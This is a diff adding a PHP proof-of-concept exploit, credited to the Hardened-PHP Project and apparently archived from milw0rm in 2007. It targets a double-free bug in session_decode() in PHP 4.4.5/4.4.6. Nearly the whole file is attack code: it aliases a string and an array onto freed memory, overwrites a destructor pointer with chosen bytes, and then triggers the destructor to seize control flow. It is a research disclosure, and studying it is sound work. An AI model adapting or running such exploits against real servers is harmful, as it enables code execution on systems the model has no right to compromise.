@@ -1,0 +1,42 @@
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //     PHP 4.4.5/4.4.6 session_decode() Double Free Vulnerability     //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  ini_set("session.serialize_handler", "php");
+  session_start();
+
+  $varname = str_repeat("D", 39);
+  $$varname = &$_SESSION;
+
+  // Trigger the double free
+  
+  session_decode($varname.'|i:0;');
+  $_________________x = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJ";
+  $_________________a = array("OneElement");
+
+  // Now x and a point to the same memory. Therefore x can be used to modify a
+
+  // Overwrite pointer to the destructor  
+  $_________________x[8*4+0] = chr(0x55);
+  $_________________x[8*4+1] = chr(0x66);
+  $_________________x[8*4+2] = chr(0x77);
+  $_________________x[8*4+3] = chr(0x88);
+  
+  // Trigger the destruction
+  unset($_________________a);
+?>
+
+# milw0rm.com [2007-03-27]
